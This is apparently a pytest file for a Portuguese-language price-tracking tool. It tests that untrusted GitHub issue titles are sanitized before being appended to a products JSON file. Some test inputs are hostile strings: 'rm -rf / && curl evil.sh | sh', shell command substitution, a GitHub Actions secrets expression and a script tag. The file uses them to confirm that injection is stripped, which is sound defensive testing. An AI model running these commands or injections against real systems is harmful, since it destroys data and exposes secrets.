"""Busca pelo site: título da issue (dado não confiável) e atualização de config/produtos.json."""
import json

import pytest

from app.busca import add_product, sanitize


@pytest.mark.parametrize("title,expected", [
    ("Buscar: Monitor Portátil", "Monitor Portátil"),
    ("buscar:monitor portatil 15.6", "monitor portatil 15.6"),
    ("Buscar:   RTX 4060 Ti 8GB  ", "RTX 4060 Ti 8GB"),
    ("Buscar: Galaxy S25+ 256GB", "Galaxy S25+ 256GB"),
    ("Buscar: Cabo USB-C/USB-A", "Cabo USB-C/USB-A"),
    ("Buscar: x; rm -rf / && curl evil.sh | sh", "x rm -rf / curl evil.sh sh"),
    ("Buscar: $(whoami) `id` ${{ secrets.X }}", "whoami id secrets.X"),
    ('Buscar: "PS5"<script>', "PS5 script"),
    ("Buscar: a_b\nlinha2\r\n=x", "a b linha2 x"),
])
def test_sanitize_keeps_only_safe_chars(title, expected):
    assert sanitize(title) == expected


@pytest.mark.parametrize("title", ["Monitor Portátil", "Buscar:", "Buscar: ?", "Buscar: - . /", "", None, "Comprar: PS5"])
def test_sanitize_rejects_invalid(title):
    assert sanitize(title) is None


def test_sanitize_limits_length():
    q = sanitize("Buscar: " + "a" * 200)
    assert len(q) == 80


def test_add_product_appends_once(tmp_path):
    p = tmp_path / "produtos.json"
    p.write_text('[\n  {"query": "PS5", "exclude": "", "target_price": null}\n]\n', encoding="utf-8")
    assert add_product(p, "Monitor Portátil")
    assert not add_product(p, "monitor portatil")      # mesmo produto, sem diferenciar acentos/caixa
    assert not add_product(p, "ps5")
    data = json.loads(p.read_text(encoding="utf-8"))
    assert data == [{"query": "PS5", "exclude": "", "target_price": None},
                    {"query": "Monitor Portátil", "exclude": "", "target_price": None}]


def test_main_writes_github_output(tmp_path, monkeypatch):
    import app.busca as busca
    prod = tmp_path / "config" / "produtos.json"
    prod.parent.mkdir()
    prod.write_text("[]\n", encoding="utf-8")
    out = tmp_path / "out.txt"
    monkeypatch.setattr(busca, "__file__", str(tmp_path / "app" / "busca.py"))
    monkeypatch.setenv("ISSUE_TITLE", "Buscar: Monitor Portátil")
    monkeypatch.setenv("GITHUB_OUTPUT", str(out))
    assert busca.main() == 0
    assert out.read_text(encoding="utf-8").splitlines() == ["query=Monitor Portátil", "added=true"]
    monkeypatch.setenv("ISSUE_TITLE", "Buscar: ;")
    assert busca.main() == 1
